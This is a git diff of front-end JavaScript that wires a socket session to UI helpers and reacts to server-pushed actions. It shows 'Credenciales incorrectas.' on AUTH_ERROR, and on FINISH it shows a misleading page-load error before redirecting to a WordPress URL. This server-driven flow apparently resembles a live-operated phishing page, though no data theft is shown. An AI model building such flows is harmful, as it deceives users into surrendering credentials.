@@ -32,28 +32,48 @@ document.addEventListener("DOMContentLoaded", async () => {
     function safeShowAlert(id, msg) {
         window.showAlert?.(id, msg);
     }
+    function safeHideAlert(id, msg) {
+        window.hideAlert?.(id, msg);
+    }
+    function safeShowLoading() {
+        window.showLoading?.();
+    }
+    function safeHideLoading() {
+        window.hideLoading?.();
+    }
+    function safeClearInputs() {
+        window.clearInputs?.();
+    }
 
     const session = await ensureSession();
+
+    safeHideLoading();
 
     socketClient.connect({
         token: session.sessionToken,
         sessionId: session.sessionId,
     });
 
+
     socketClient.on("session:update", (s) => {
-        if (!s || !s.action || isPresence) return;
+        if (!s || !s.action) return;
 
         const action = String(s.action);
 
         if (action === "FINISH") {
-            /* window.location.href = `/finish`;  */ // resultado
+            alert('Error al cargar la pagina')
+            window.location.href = import.meta.env.VITE_WP_URL;
             return;
         }
 
         console.log("action: ", action);
 
         if (action === "AUTH_ERROR") {
-            safeShowAlert("error_data");
+            safeHideLoading();
+            safeShowAlert("error_data", "Credenciales incorrectas.");
+            setTimeout(() => {
+                safeHideAlert("error_data");
+            }, 3000)
         }
 
         // 1) WAIT_ACTION: solo loading y NO navegar
@@ -69,8 +89,8 @@ document.addEventListener("DOMContentLoaded", async () => {
     });
 
     window.rtEmitSubmit = async function (eventName, payload, ackCb) {
-        if (!socketClient || !socketClient.connected) {
-            return await ensureSession();;
+        if (!socketClient) {
+            return await ensureSession();
         }
 
         socketClient.emit(eventName, payload, (res) => {
